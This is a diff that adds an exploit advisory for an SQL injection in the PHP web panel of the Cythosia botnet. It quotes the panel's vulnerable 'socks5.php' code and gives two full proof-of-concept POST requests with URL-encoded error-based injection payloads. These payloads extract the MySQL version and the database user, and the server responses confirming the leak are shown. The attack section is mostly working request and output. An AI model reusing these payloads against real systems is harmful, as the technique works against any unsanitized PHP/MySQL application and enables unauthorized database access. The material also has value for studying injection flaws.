@@ -1,0 +1,73 @@
+##########################################################################
+# Exploit Title: Cythosia Botnet SQL-Injection Vulnerability 
+ # Date: 11.12.2013
+ # Exploit Author: GalaxyAndroid
+ # Vendor Homepage: unkn0wn
+# Application Screenshots
+http://www.xylibox.com/2012/08/cythosia-botnet-vnloader.html 
+ # Version: 2.x
+ # Tested on: Windows 7 with Xampp 
+# greets goes to: ChrisKSK, Protestants in Ukraine -> keep pushing!
+# no greets to: NSA, GCHQ, USA, AUS, CAN, GBR, NZL
+#################################Vuln-Code###################################
+# Vuln-Code: 
+#All POST-Parameters in the file "socks5.php" are vuln against
+SQL-Injection
+#
+#if(!empty($_POST['hwid']) && !empty($_POST['cn']) &&
+!empty($_POST['ip']) && !empty($_POST['port']))
+#    {
+#        $query = mysql_query("SELECT * FROM hydra_socks WHERE hwid =
+'".$_POST['hwid']."'");
+#        if(mysql_num_rows($query) >= 1)
+#        {
+#            $sql = mysql_query("UPDATE hydra_socks SET ip =
+'".$_POST['ip']."', port = '".$_POST['port']."' WHERE hwid =
+'".$_POST['hwid']."'");
+#        }
+#        else
+#        {
+#            $sql = mysql_query("INSERT INTO hydra_socks (`hwid`,
+`country`, `ip`, `port`) VALUES ('".$_POST['hwid']."',
+'".$_POST['cn']."', '".$_POST['ip']."', '".$_POST['port']."')");
+#        }
+#        if(!$sql)
+#        {
+#            echo "fail";
+#            echo mysql_error();
+#        }
+##############################Exploit########################################
+#
+# PoC 1 - Gets the MySQL Version Information: 
+	POST http://127.0.0.1/cythosia/Webpanel/socks5.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 322
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1;
+.NET CLR 2.0.50727) Miauu
+Connection: Close
+
+	hwid=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cversion%28%29%2C0x27%2C0x7e%29%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271&cn=test&ip=test&port=test
+	Response: 
+	Warning:  mysql_num_rows() expects parameter 1 to be resource,
+boolean given in C:xamppneuhtdocscythosiaWebpanelsocks5.php on line 11
+failDuplicate entry '~'5.5.32'~1' for key 'group_key'
+ # PoC 2 - whoami?
+
+POST /cythosia/Webpanel/socks5.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 319
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1;
+.NET CLR 2.0.50727)
+Connection: Close
+
+hwid=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cuser%28%29%2C0x27%2C0x7e%29%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271&cn=test&ip=test&port=test
+Response:
+Warning:  mysql_num_rows() expects parameter 1 to be resource, boolean
+given in C:xampphtdocscythosiaWebpanelsocks5.php on line 11
+failDuplicate entry '~'root@localhost'~1' for key 'group_key'
+
+############################################################################
